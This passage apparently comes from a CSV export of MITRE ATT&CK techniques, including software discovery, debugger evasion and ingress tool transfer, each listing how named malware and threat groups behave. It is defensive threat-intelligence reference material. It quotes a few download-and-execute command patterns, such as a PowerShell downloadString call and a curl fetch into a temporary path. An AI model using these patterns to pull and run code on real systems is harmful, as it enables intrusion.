'[Cobalt Group] leveraged an open-source tool called SoftPerfect Network Scanner to perform network scanning.', '[Caterpillar WebShell] has a module to use a port scanner on a system. ', '[Pysa] can perform network reconnaissance using the Advanced Port Scanner tool.', '[Operation Wocao] has scanned for open ports and used nbtscan to find NETBIOS nameservers.', '[CostaRicto] employed nmap and pscan to scan target environments.', '[Cobalt Strike] can perform port scans from an infected host.', 'APT34 has used the publicly available tool SoftPerfect Network Scanner as well as a custom tool called GOLDIRONY to conduct network scanning.']",False
T1518,Software Discovery,"Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from [Software Discovery] during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.  Such software may be deployed widely across the environment for configuration management or security reasons, such as [Software Deployment Tools] and may allow adversaries broad access to infect devices or move laterally.  Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to [Exploitation for Privilege Escalation]","['[Metamorfo] has searched the compromised system for banking applications.', '[XCSSET] uses <code>ps aux</code> with the <code>grep</code> command to enumerate common browsers and system processes potentially impacting [XCSSET] exfiltration capabilities.', '[Siloscape] searches for the kubectl binary.', '[Volt Typhoon] has queried the Registry on compromised systems for information on installed software.', '[CharmPower] can list the installed applications on a compromised host.', '[ShimRatReporter] gathered a list of installed software on the infected host.', '[DustySky] lists all installed software for the infected machine.', '[SUGARDUMP] can identify Chrome, Opera, Edge Chromium, and Firefox browsers, including version number, on a compromised host.', ""[ComRAT] can check the victim's default browser to determine which process to inject its communications module into."", 'The [Cobalt Strike] System Profiler can discover applications through the browser and identify the version of Java the target has.', '[Windigo] has used a script to detect installed software on targeted systems.', '[Inception] has enumerated installed software on compromised systems.', '[Dridex] has collected a list of installed software on the system.', '[SpicyOmelette] can enumerate running software on a targeted system.', '[BRONZE BUTLER] has used tools to enumerate software installed on an infected host.', ""[Orz] can gather the victim's Internet Explorer version."", '[Windshift] has used malware to identify installed software.', '[MuddyWater] has used a PowerShell backdoor to check for Skype connectivity on the target machine.', '[Bazar] can query the Registry for installed applications.', '[TajMahal] has the ability to identify the Internet Explorer (IE) version on an infected host.', '[Wizard Spider] has utilized the PowerShell script `Get-DataInfo.ps1` to collect installed backup software information from a compromised machine.', '[P.A.S. Webshell] can list PHP server configuration details.', '[Bundlore] has the ability to enumerate what browser is being used as well as version information for Safari.', '[SideCopy] has collected browser information from a compromised host.', '[Sidewinder] has used tools to enumerate software installed on an infected host.', '[Mustang Panda] has searched the victim system for the <code>InstallUtil.exe</code> program and its version.', '[InvisiMole] can collect information about installed software used by specific users, software executed on user login, and software executed by each system.', ""[SocGholish] can identify the victim's browser in order to serve the correct fake update page."", 'During [Operation Dust Storm] the threat actors deployed a file called `DeployJava.js` to fingerprint installed software on a victim system prior to exploit delivery.', '[down_new] has the ability to gather information on installed applications.', '[SVCReady] can collect a list of installed software from an infected host.', '[HotCroissant] can retrieve a list of applications from the <code>SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths</code> registry key.', '[MarkiRAT] can check for the Telegram installation directory by enumerating the files on disk.', '[HEXANE] has enumerated programs installed on an infected machine.', '[KGH_SPY] can collect information on installed applications.', '[QakBot] can enumerate a list of installed programs.', '[Dyre] has the ability to identify installed programs on a compromised host.', 'During [Operation Wocao] threat actors collected a list of installed software on the infected system.', '[Woody RAT] can collect .NET, PowerShell, and Python information from an infected host.', '[RTM] can scan victim drives to look for specific banking software on the machine to determine next actions.', ""[Tropic Trooper] backdoor could list the infected system's installed software."", '[Samurai] can check for the presence and version of the .NET framework.', '[Operation Wocao] has collected a list of installed software on the infected system.']",False
T1538,Cloud Service Dashboard,"An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.  Depending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.",['[Scattered Spider] abused AWS Systems Manager Inventory to identify targets on the compromised network prior to lateral movement.'],False
T1622,Debugger Evasion,"Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.  Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to [Virtualization/Sandbox Evasion] if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.  Specific checks will vary based on the target and/or adversary, but may involve [Native API] function calls such as <code>IsDebuggerPresent()</code> and <code> NtQueryInformationProcess()</code>, or manually checking the <code>BeingDebugged</code> flag of the Process Environment Block (PEB). Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would “swallow” or handle the potential error).  Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping [Native API] function calls such as <code>OutputDebugStringW()</code>.","['[AsyncRAT] can use the `CheckRemoteDebuggerPresent` function to detect the presence of a debugger.', '[DarkGate] checks the <code>BeingDebugged</code> flag in the PEB structure during execution to identify if the malware is being debugged.', '[ROKRAT] can check for debugging tools.', '[DRATzarus] can use `IsDebuggerPresent` to detect whether a debugger is present on a victim.', 'The [Black Basta] dropper can check system flags, CPU registers, CPU instructions, process timing, system libraries, and APIs to determine if a debugger is present.', '[Saint Bot] has used `is_debugger_present` as part of its environmental checks.', 'During [Operation Dream Job] [Lazarus Group] used tools that used the `IsDebuggerPresent` call to detect debuggers.', '[DarkTortilla] can detect debuggers by using functions such as `DebuggerIsAttached` and `DebuggerIsLogging`. [DarkTortilla] can also detect profilers by verifying the `COR_ENABLE_PROFILING` environment variable is present and active.', '[Mafalda] can search for debugging tools on a compromised host.', '[ThiefQuest] uses a function named <code>is_debugging</code> to perform anti-debugging logic. The function invokes <code>sysctl</code> checking the returned value of <code>P_TRACED</code>. [ThiefQuest] also calls <code>ptrace</code> with the <code>PTRACE_DENY_ATTACH</code> flag to prevent debugging.', '[Bumblebee] can search for tools used in static analysis.']",False
T1052,Exfiltration Over Physical Medium,"Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.",[],
T1105,Ingress Tool Transfer,"Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as [ftp] Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. [Lateral Tool Transfer]   On Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, [certutil] and [PowerShell] commands such as <code>IEX(New-Object Net.WebClient).downloadString()</code> and <code>Invoke-WebRequest</code>. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`.  Adversaries may also abuse installers and package managers, such as `yum` or `winget`, to download tools to victim hosts. Adversaries have also abused file application features, such as the Windows `search-ms` protocol handler, to deliver malicious files to victims through remote file searches invoked by [User Execution] (typically after interacting with [Phishing] lures).  Files can also be transferred using various [Web Service] as well as native or otherwise present tools on the victim system. In some cases, adversaries may be able to leverage services that sync between a web-based and an on-premises client, such as Dropbox or OneDrive, to transfer files onto victim systems. For example, by compromising a cloud account and logging into the service's web portal, an adversary may be able to trigger an automatic syncing process that transfers the file onto the victim's machine.","['[Fox Kitten] has downloaded additional tools including [PsExec] directly to endpoints.', '[EvilBunny] has downloaded additional Lua scripts from the C2.', '[Pandora] can load additional drivers and files onto a victim machine.', '[ShimRat] can download additional files.', '[BUSHWALK] can write malicious payloads sent through a web request’s command parameter.', '[DarkTortilla] can download additional packages for keylogging, cryptocurrency mining, and other capabilities; it can also retrieve malicious payloads such as [Agent Tesla] AsyncRat, [NanoCore] RedLine, [Cobalt Strike] and Metasploit.', '[SodaMaster] has the ability to download additional payloads from C2 to the targeted system.', '[BITTER] has downloaded additional malware and tools onto a compromised host. ', '[Shark]  can download additional files from its C2 via HTTP or DNS.', '[More_eggs] can download and launch additional payloads.', '[SEASHARPEE] can download remote files onto victims.', '[WellMail] can receive data and executable scripts from C2.', '[HAFNIUM] has downloaded malware and tools--including Nishang and PowerCat--onto a compromised host. ', ""[Cobalt Group] has used public sites such as github.com and sendspace.com to upload files and then download them to victim computers. The group's JavaScript backdoor is also capable of downloading files."", '[DDKONG] downloads and uploads files on the victim’s machine.', '[macOS.OSAMiner] has used `curl` to download a [Stripped Payloads] from a public facing adversary-controlled webpage. ', '[SoreFang] can download additional payloads from C2.', '[ANDROMEDA] can download additional payloads from C2.', '[ZxxZ] can download and execute additional files.', '[Cinnamon Tempest] has downloaded files, including [Cobalt Strike] to compromised hosts.', '[Ursnif] has dropped payload and configuration files to disk. [Ursnif] has also been used to download and execute additional payloads.', '[HTTPBrowser] is capable of writing a file to the compromised system from the C2 server.', '[Action RAT] has the ability to download additional payloads onto an infected machine.', '[Vasport] can download files.', '[down_new] has the ability to download files to the compromised host.', '[Tropic Trooper] has used a delivered trojan to download additional files.', '[BendyBear] is designed to download an implant from a C2 server.', '[Wiarp] creates a backdoor through which remote attackers can download files.', '[Nerex] creates a backdoor through which remote attackers can download files onto a compromised host.', '[CostaBricks] can download additional payloads onto a compromised host.', '[NanoCore] has the capability to download and activate additional modules for execution.', '[StoneDrill] has downloaded and dropped temporary files containing scripts; it additionally has a function to upload files from the victims machine.\t', '[Lazarus Group] has downloaded files, malware, and tools from its C2 onto a compromised host.', '[Anchor] can download additional payloads.', '[Denis] deploys additional backdoors and hacking tools to the system.', '[TURNEDUP] is capable of downloading additional files.', '[PLATINUM] has transferred files using the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel.', '[Disco] can download files to targeted systems via SMB.', '[ShimRatReporter] had the ability to download additional payloads.', '[Elise] can download additional files from the C2 server for execution.', '[Okrum] has built-in commands for uploading, downloading, and executing files to the system.', '[Pupy] can upload and download to/from a victim machine.', '[Ke3chang] has used tools to download files to compromised machines.', '[Nebulae] can download files from C2.', '[Exaramel for Linux] has a command to download a file from  and to a remote C2 server.', '[QuietSieve] can download and execute payloads on a target host.', '[njRAT] can download files to the victim’s machine.', 'During [CostaRicto] the threat actors downloaded malware and tools onto a compromised host.', '[Seth-Locker] has the ability to download and execute files on a compromised host.', '[YAHOYAH] uses HTTP GET requests to download other files that are executed in memory.', '[Hi-Zor] has the ability to upload and download files from its C2 server.', '[Whitefly] has the ability to download additional tools from the C2.', '[BabyShark] has downloaded additional files from the C2.', '[APT37] has downloaded second stage malware from compromised websites.', '[BackConfig] can download and execute additional payloads on a compromised host.', '[SILENTTRINITY] can load additional files and tools, including [Mimikatz]', '[Bisonal] has the capability to download files to execute on the victim’s machine. ', '[BLINDINGCAN] has downloaded files to a victim machine.', '[SpeakUp] downloads and executes additional files from a remote server. ', '[SQLRat] can make a direct SQL connection to a Microsoft database controlled by the attackers, retrieve an item from the bindata table, then write and execute the file on disk.\t', '[SideCopy] has delivered trojanized executables via spearphishing emails that contacts actor-controlled servers to download malicious payloads.', '[TSCookie] has the ability to upload and download files to and from the infected host.', '[Skidmap] has the ability to download files on an infected host. ', '[Revenge RAT] has the ability to upload and download files.', ' [TA2541] has used malicious scripts and macros with the ability to download additional payloads. ', '[Kimsuky] has downloaded additional scripts, tools, and malware onto victim systems.', ""[Meteor] has the ability to download additional files for execution on the victim's machine."", '[ZLib] has the ability to download files.', '[Turla] has used shellcode to download Meterpreter after compromising a victim.', ""[Grandoreiro] can download its second stage from a hardcoded URL within the loader's code."", '[BLUELIGHT] can download additional files onto the host. ', '[RogueRobin] can save a new file to the system from the C2 server.', '[Kazuar] downloads additional plug-ins to load on the victim’s machine, including the ability to upgrade and replace its own binary.', '[Neoichor] can download additional files onto a compromised host.', '[BoxCaon] can download files.', '[Daserf] can download remote files.', ""[Zebrocy] obtains additional code to execute on the victim's machine, including the downloading of a secondary payload."", '[Gamaredon Group] has downloaded additional malware and tools onto a compromised host.', '[LOWBALL] uses the Dropbox API to request two files, one of which is the same file as the one dropped by the malicious email attachment. This is most likely meant to be a mechanism to update the compromised host with a new version of the [LOWBALL] malware.', '[Kessel] can download additional modules from the C2 server.', '[Leviathan] has downloaded additional scripts and files from adversary-controlled servers.', 'During [Operation Dream Job] [Lazarus Group] downloaded multistage malware and tools onto a compromised host.', '[PolyglotDuke] can retrieve payloads from the C2 server.', '[Dipsind] can download remote files.', '[Peppy] can download and execute remote files.', '[cmd] can be used to copy files to/from a remotely connected external system.', '[menuPass] has installed updates and new malware on victims.', '[RainyDay] can download files to a compromised host.', '[Cardinal RAT] can download and execute additional payloads.', '[WarzoneRAT] can download and execute additional files.', '[MarkiRAT] can download additional files and tools from its C2 server, including through the use of [BITSAdmin]', 'During [C0027] [Scattered Spider] downloaded tools using victim organization systems.', '[KARAE] can upload and download files, including second-stage malware.', '[Molerats] used executables to download malicious files from different sources. ', '[Small Sieve] has the ability to download files.', '[China Chopper] server component can download remote files.', '[XCSSET] downloads browser specific AppleScript modules using a constructed URL with the <code>curl</code> command, <code>https://"" & domain & ""/agent/scripts/"" & moduleName & "".applescript</code>.', '[KEYMARBLE] can upload files to the victim’s machine and can download additional payloads.', '[Carberp] can download and execute new plugins from the C2 server. ', '[Unknown Logger] is capable of downloading remote files.', '[Lucifer] can download and execute a replica of itself using [certutil]', '[Sakula] has the capability to download files.', '[PoetRAT] has the ability to copy files and download/upload files into C2 channels using FTP and HTTPS.', '[gh0st RAT] can download files to the victim’s machine.', '[BoomBox] has the ability to download next stage malware components to a compromised system.', '[RegDuke] can download files from C2.', '[NDiskMonitor] can download and execute a file from given URL.', '[LitePower] has the ability to download payloads containing system commands to a compromised host.', '[Pteranodon] can download and execute additional files.', '[Briba] downloads files onto infected hosts.', '[Dacls] can download its payload from a C2 server.', '[Saint Bot] can download additional files onto a compromised host.', '[FYAnti] can download additional payloads to a compromised host.\t ', '[WIREFIRE] has the ability to download files to compromised devices.', '[APT29] has downloaded additional tools and malware onto compromised networks.', '[Hancitor] has the ability to download additional files from C2.', '[Shamoon] can download an executable to run on the victim.', '[Rocke] used malware to download additional malicious files to the target system.\t', '[PipeMon] can install additional modules via C2 commands.', '[Pony] can download additional files onto the infected system.\t', '[SVCReady] has the ability to download additional tools such as the RedLine Stealer to an infected host.', '[Kevin] can download files to the compromised host.', ""[Sidewinder] has used LNK files to download remote files to the victim's network."", ""[Calisto] has the capability to upload and download files to the victim's machine."", '[Agent Tesla] can download additional files for execution on the victim’s machine.', '[Koadic] can download additional files and tools.', '[Mis-Type] has downloaded additional malware and files onto a compromised host.', '[Chrommme] can download its code from C2.', '[TYPEFRAME] can upload and download files to the victim’s machine.', '[ServHelper] may download additional files to execute.', '[Nidiran] can download and execute files.', '[SocGholish] can download additional malware to infected hosts.', '[SMOKEDHAM] has used Powershell to download UltraVNC and [ngrok] from third-party file sharing sites.', '[Gold Dragon] can download additional components from the C2 server.', '[Bandook] can download files to the system.', '[Dyre] has a command to download and executes additional files.', '[Magic Hound] has downloaded additional code and files from servers onto victims.', '[NanHaiShu] can download additional files from URLs.', '[CostaBricks] has been used to load [SombRAT] onto a compromised host.', '[GrimAgent] has the ability to download and execute additional payloads.', '[Sardonic] has the ability to upload additional malicious files to a compromised machine.', '[QuasarRAT] can download files to the victim’s machine and execute them.', '[S-Type] can download additional files onto a compromised host.', '[Smoke Loader] downloads a new version of itself once it has installed. It also downloads additional plugins.', '[PowerLess] can download additional payloads to a compromised host.', '[RARSTONE] downloads its backdoor component from a C2 server and loads it directly into memory.', '[Zeus Panda] can download additional malware plug-in modules and execute them on the victim’s machine.', 'During [Frankenstein] the threat actors downloaded files and tools onto a victim machine.', '[SLOWDRIFT] downloads additional payloads.', '[AuditCred] can download files and additional malware.', '[Milan] has received files from C2 and stored them in log folders beginning with the character sequence `a9850d2f`.', '[ThreatNeedle] can download additional tools to enable lateral movement.', '[Industroyer] downloads a shellcode payload from a remote C2 server and loads it into memory.', '[Aquatic Panda] has downloaded additional malware onto compromised hosts.', '[APT38] used a backdoor, NESTEGG, that has the capability to download and upload files to and from a victim’s machine.', '[Zox] can download files to a compromised machine.', ""[MobileOrder] has a command to download a file from the C2 server to the victim mobile device's SD card."", '[BBK] has the ability to download files from C2 to the infected host.', '[Attor] can download additional plugins, updates and other files. ', '[Melcoz] has the ability to download additional files to a compromised host.', '[LuminousMoth] has downloaded additional malware and tools onto a compromised host.', '[SeaDuke] is capable of uploading and downloading files.', '[NavRAT] can download files remotely.', '[Linfo] creates a backdoor through which remote attackers can download files onto compromised hosts.', '[Waterbear] can receive and load executables from remote C2 servers.', '[OSX_OCEANLOTUS.D] has a command to download and execute a file on the victim’s machine.', '[Hydraq] creates a backdoor through which remote attackers can download files and additional malware components.', '[RAPIDPULSE] can transfer files to and from compromised hosts.', '[SombRAT] has the ability to download and execute additional payloads.', '[Gorgon Group] malware can download additional files from C2 servers.', '[DnsSystem] can download files to compromised systems after receiving a command with the string `downloaddd`.', '[APT39] has downloaded tools to compromised hosts.', '[WellMess] can write files to a compromised host.', '[CSPY Downloader] can download additional tools to a compromised host.', '[Samurai] has been used to deploy other malware including [Ninja]', '[Cuba] can download files from its C2 server.', '[KOCTOPUS] has executed a PowerShell command to download a file to the system.', '[APT28] has downloaded additional files, including by using a first-stage downloader to contact the C2 server to obtain the second-stage implant.', '[NOKKI] has downloaded a remote module for execution.', '[Taidoor] has downloaded additional files onto a compromised host.', '[Squirrelwaffle] has downloaded and executed additional encoded payloads.', '[DRATzarus] can deploy additional tools onto an infected machine.', '[RCSession] has the ability to drop additional files to an infected machine.', '[MiniDuke] can download additional encrypted backdoors onto the victim via GIF files.', 'During [C0015] the threat actors downloaded additional tools and files onto a compromised network.', '[Threat Group-3390] has downloaded additional malware and tools, including through the use of `certutil`, onto a compromised host .', '[Doki] has downloaded scripts from C2.', '[SideTwist] has the ability to download additional files.', '[Bundlore] can download and execute new versions of itself.', '[DanBot] can download additional files to a targeted system.', '[Mosquito] can upload and download files to the victim.', '[CARROTBALL] has the ability to download and install a remote payload.', '[Azorult] can download and execute additional files. [Azorult] has also downloaded a ransomware payload called Hermes.', '[Bumblebee] can download and execute additional payloads including through the use of a `Dex` command.', ""[Volgmer] can download remote files and additional payloads to the victim's machine."", '[Trojan.Karagany] can upload, download, and execute files on the victim.', '[Penquin] can execute the command code <code>do_download</code> to retrieve remote files from C2.', 'can download and execute a second-stage payload.', '[SharpStage] has the ability to download and execute additional payloads via a DropBox API.', '[TinyTurla] has the ability to act as a second-stage dropper used to infect the system with additional malware.', '[jRAT] can download and execute files.', '[CHOPSTICK] is capable of performing remote file transmission.', '[Orz] can download files onto the victim.', '[certutil] can be used to download files from a given URL.', '[Rancor] has downloaded additional malware, including by using [certutil]', '[JPIN] can download files and upgrade itself.', '[SysUpdate] has the ability to download files to a compromised host.', '[Seasalt] has a command to download additional files.', '[DarkComet] can load any files onto the infected machine to execute.', '[FIN13] has downloaded additional tools and malware to compromised systems.', '[BADHATCH] has the ability to load a second stage malicious DLL file onto a compromised machine. ', '[Ixeshe] can download and execute additional files.', '[DEATHRANSOM] can download files to a compromised host.', '[PlugX] has a module to download and execute files on the compromised machine.', 'During the [2015 Ukraine Electric Power Attack] [Sandworm Team] pushed additional malicious tools onto an infected system to steal user credentials, move laterally, and destroy data. ', '[Micropsia] can download and execute an executable from the C2 server.', '[SDBbot] has the ability to download a DLL from C2 to a compromised host.', '[CookieMiner] can download additional scripts from a web server.', ""[SpicyOmelette] can download malicious files from threat actor controlled AWS URL's."", '[CloudDuke] downloads and executes additional malware from either a Web address or a Microsoft OneDrive account.', '[Pasam] creates a backdoor through which remote attackers can upload files.', '[Xbash] can download additional malicious files from its C2 server.', '[LightNeuron] has the ability to download and execute additional files.', '[Remsec] contains a network loader to receive executable modules from remote attackers and run them on the local victim. It can also upload and download files over HTTP and HTTPS.', '[Flagpro] can download additional malware from the C2 server.', '[MuddyWater] has used malware that can upload additional files to the victim’s machine.', '[Emissary] has the capability to download files from the C2 server.', '[DropBook] can download and execute additional files.', '[Helminth] can download additional files.', '[Valak] has downloaded a variety of modules and payloads to the compromised host, including [IcedID] and NetSupport Manager RAT-based malware.', '[Egregor] has the ability to download files from its C2 server.', '[KONNI] can download files and execute them on the victim’s machine. ', '[PowerPunch] can download payloads from adversary infrastructure.', '[APT18] can upload a file to the victim’s machine.', '[KeyBoy] has a download and upload functionality.', '[Woody RAT] can download files from its C2 server, including the .NET DLLs, `WoodySharpExecutor` and `WoodyPowerSession`. ', '[DarkGate] retrieves cryptocurrency mining payloads and commands in encrypted traffic from its command and control server. [DarkGate] uses Windows Batch scripts executing the <code>curl</code> command to retrieve follow-on payloads.', '[VaporRage] has the ability to download malicious shellcode to compromised systems.', '[TeamTNT] has the <code>curl</code> and <code>wget</code> commands as well as batch scripts to download new tools.', 'During [Cutting Edge] threat actors leveraged exploits to download remote files to Ivanti Connect Secure VPNs.', '[Gazer] can execute a task to download a file.', '[PUNCHBUGGY] can download additional files and payloads to compromised hosts.', '[OilRig] can download remote files onto victims.', '[PowerDuke] has a command to download a file.', '[SHARPSTATS] has the ability to upload and download files.', '[DOGCALL] can download and execute additional payloads.', '[LoudMiner] used SCP to update the miner from the C2.', '[KGH_SPY] has the ability to download and execute code from remote servers.', '[Sibot] can download and execute a payload onto a compromised system.', '[PLEAD] has the ability to upload and download files to and from an infected host.', '[Winnti for Linux] has the ability to deploy modules directly from command and control (C2) servers, possibly for remote command execution, file exfiltration, and socks5 proxying on the infected host. ', '[BadPatch] can download and execute or update malware.', '[ROKRAT] can retrieve additional malicious payloads from its C2 server.', '[LazyScripter] had downloaded additional tools to a compromised host.', '[ChChes] is capable of downloading files, including additional modules.', '[Kivars] has the ability to download and execute files.', '[APT32] has added JavaScript to victim websites to download additional frameworks that profile and compromise website visitors.', '[Silence] has downloaded additional modules and malware to victim’s machines.\t', '[Sliver] can upload files from the C2 server to the victim machine using the <code>upload</code> command.', '[Gelsemium] can download additional plug-ins to a compromised host.', '[Confucius] has downloaded additional files and payloads onto a compromised host following initial access.', 'During [C0021] the threat actors downloaded additional tools and files onto victim machines. ', '[HotCroissant] has the ability to upload a file from the command and control (C2) server to the victim machine.', '[P8RAT] can download additional payloads to a target system.', '[Avenger] has the ability to download files from C2 to a compromised host.', 'During [FunnyDream] the threat actors downloaded additional droppers and backdoors onto a compromised system. ', ""[OopsIE] can download files from its C2 server to the victim's machine."", '[Backdoor.Oldrea] can download additional modules from C2.', '[TAINTEDSCRIBE] can download additional modules from its C2 server.', ' [Machete] can download additional files for execution on the victim’s machine. ', '[Snip3] can download additional payloads to compromised systems.', '[Mafalda] can download additional files onto the compromised host.', '[FoggyWeb] can receive additional malicious components from an actor controlled C2 server and execute them on a compromised AD FS server.', '[SLOTHFULMEDIA] has downloaded files onto a victim machine.', '[CoinTicker] executes a Python script to download its second stage.', '[Kwampirs] downloads additional files from C2 servers.', ""[GuLoader] can download further malware for execution on the victim's machine."", '[FunnyDream] can download additional files onto a compromised host.', 'After downloading its main config file, [Downdelph] downloads multiple payloads from C2 servers.', '[Ember Bear] has used tools to download malicious code.', ""[Tomiris] can download files and execute them on a victim's system."", '[CARROTBAT] has the ability to download and execute a remote file via [certutil]', '[BITSAdmin] can be used to create [BITS Jobs] to upload and/or download files.', '[FlawedAmmyy] can transfer files from C2.', '[Kerrdown] can download specific payloads to a compromised host based on OS architecture.', '[ABK] has the ability to download files from C2.', '[Crimson] contains a command to retrieve files from its C2 server.', '[APT33] has downloaded additional files and programs from its C2 server.\t ', '[Wizard Spider] can transfer malicious payloads such as ransomware to compromised machines.', ""[Bankshot] uploads files and secondary payloads to the victim's machine."", '[Lizar] can download additional plugins, files, and tools.', '[Psylo] has a command to download a file to the system from its C2 server.', '[GreyEnergy] can download additional modules and payloads.', '[UPPERCUT] can download and upload files to and from the victim’s machine.', '[Amadey] can download and execute files to further infect a host machine with additional malware.', '[WEBC2] can download and execute a file.', '[LiteDuke] has the ability to download files.', '[Explosive] has a function to download a file to the infected system. ', '[H1N1] contains a command to download and execute a file from a remotely hosted URL using WinINet HTTP requests.', '[IcedID] has the ability to download additional modules and a configuration file from C2.', '[NightClub] can load multiple additional plugins on an infected host.', 'During [C0026] the threat actors downloaded malicious payloads onto select compromised hosts.', '[REvil] can download a copy of itself from an attacker controlled IP address to the victim machine.', '[QakBot] has the ability to download additional components and malware.', '[Volatile Cedar] can deploy additional tools.', '[RDAT] can download files via DNS.\t', '[Mongall] can download files to targeted systems.', '[CreepyDrive] can download files to the compromised host.', '[Evilnum] can deploy additional components or tools as needed.', 'The [Winnti for Windows] dropper can place malicious payloads on targeted systems.', '[Astaroth] uses [certutil] and [BITSAdmin] to download additional malware. ', '[Remcos] can upload and download files to and from the victim’s machine.', '[Misdat] is capable of downloading files from the C2.', '[PoisonIvy] creates a backdoor through which remote attackers can upload files.', ""[xCaon] has a command to download files to the victim's machine."", '[TDTESS] has a command to download and execute an additional file.', '[BISCUIT] has a command to download a file from the C2 server.', ""[FIN7] has downloaded additional malware to execute on the victim's machine, including by using a PowerShell script to launch shellcode that retrieves an additional payload. "", '[Uroburos] can use a `Put` command to write files to an infected machine.', '[TA505] has downloaded additional malware to execute on victim systems.', '[RemoteCMD] copies a file over to the remote system before execution.', ""[EVILNUM] can download and upload files to the victim's computer."", '[BADNEWS] is capable of downloading additional files through C2 channels, including a new version of itself.', '[APT41] used [certutil] to download additional files. [APT41] downloaded post-exploitation tools such as [Cobalt Strike] via command shell following initial access.', '[HOPLIGHT] has the ability to connect to a remote host in order to upload and download files.\t', 'During the [SolarWinds Compromise] [APT29] downloaded additional malware, such as [TEARDROP] and [Cobalt Strike] onto a compromised host following initial access.', ""[Nomadic Octopus] has used malicious macros to download additional files to the victim's machine. "", '[BackdoorDiplomacy] has downloaded additional files and tools onto a compromised host.', '[GoldenSpy] constantly attempts to download and execute files from the remote C2, including [GoldenSpy] itself if not found on the system.\t', ""[InvisiMole] can upload files to the victim's machine for operations."", 'During [C0010] UNC3890 actors downloaded tools and malware onto a compromised host.', '[MechaFlounder] has the ability to upload and download files to and from a compromised host.', 'During [Operation Sharpshooter] additional payloads were downloaded after a target was infected with a first-stage downloader.', ""[BlackMould] has the ability to download files to the victim's machine."", '[GoldMax] can download and execute additional files.', '[ftp] may be abused by adversaries to transfer tools or files from an external system into a compromised environment.', '[esentutl] can be used to copy files from a given URL.', '[HEXANE] has downloaded additional payloads and malicious scripts onto a compromised host.', '[metaMain] can download files onto compromised systems.', '[OSX/Shlayer] can download payloads, and extract bytes from files. [OSX/Shlayer] uses the <code>curl -fsL ""$url"" >$tmp_path</code> command to download malicious payloads into a temporary directory.', '[CallMe] has the capability to download a file to the victim from the C2 server.', '[POSHSPY] downloads and executes additional PowerShell code and Windows binaries.', '[HiddenWasp] downloads a tar compressed archive from a download server to the system.', '[Turian] can download additional files and tools from its C2.', '[ZeroT] can download additional payloads onto the victim.', '[BADFLICK] has download files from its C2 server.', '[Winnti Group] has downloaded an auxiliary program named ff.exe to infected machines.', '[Kasidet] has the ability to download and execute additional files.', '[APT-C-36] has downloaded binary data from a specified domain after the malicious document is opened.', '[FIN8] has used remote code execution to download subsequent payloads.', '[Windshift] has used tools to deploy additional payloads to compromised hosts.', '[TA551] has retrieved DLLs and installer binaries for malware execution from C2.', '[SHUTTERSPEED] can download and execute an arbitary executable.', '[POWRUNER] can download or upload files from its C2 server.', '[Mustang Panda] has downloaded additional executables following the initial infection stage.', '[Bazar] can download and deploy additional payloads, including ransomware and post-exploitation frameworks such as [Cobalt Strike]', '[Donut] can download and execute previously staged shellcode payloads.', '[Octopus] can download additional files and tools onto the victim’s machine.', '[StrongPity] can download files to specified targets.', '[RTM] can download additional files.', '[HyperBro] has the ability to download additional files.', 'During [Operation Honeybee] the threat actors downloaded additional malware and malicious scripts onto a compromised host.', '[AsyncRAT] has the ability to download files over SFTP.', '[Cyclops Blink] has the ability to download files to target systems.', '[Dragonfly] has copied and installed tools for operations once in the victim environment.', '[Aria-body] has the ability to download additional payloads from C2.', '[MoleNet] can download additional payloads from the C2. ', '[Hildegard] has downloaded additional scripts that build and run Monero cryptocurrency miners.', '[Moses Staff] has downloaded and installed web shells to following path <code>C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\IISpool.aspx</code>.', '[Darkhotel] has used first-stage payloads that download additional malware from C2 servers.', '[Pisloader] has a command to upload a file to the victim machine.', '[POWERSTATS] can retrieve and execute additional [PowerShell] payloads from the C2 server.', '[MCMD] can upload additional files to a compromised host.', '[Cobalt Strike] can deliver additional payloads to victim machines.', '[WIRTE] has downloaded PowerShell code from the C2 server to be executed.', '[POWERSOURCE] has been observed being used to download [TEXTMATE] and the Cobalt Strike Beacon payload onto victims.', '[Caterpillar WebShell] has a module to download and upload files to the system. ', '[Diavol] can receive configuration updates and additional payloads including wscpy.exe from C2.', ""[VERMIN] can download and upload files to the victim's machine."", ' [Brute Ratel C4] can download files to compromised hosts.', '[Mivast] has the capability to download and execute .exe files.', '[BRONZE BUTLER] has used various tools to download files, including DGet (a similar tool to wget).', '[build_downer] has the ability to download files from C2 to the infected host.', '[RATANKBA] uploads and downloads information.', ""[TrickBot] downloads several additional files and saves them to the victim's machine."", '[Indrik Spider] has downloaded additional scripts, malware, and tools onto a compromised host.', '[Patchwork] payloads download additional files from the C2 server.', '[Bonadan] can download additional modules from the C2 server.', '[Cryptoistic] has the ability to send 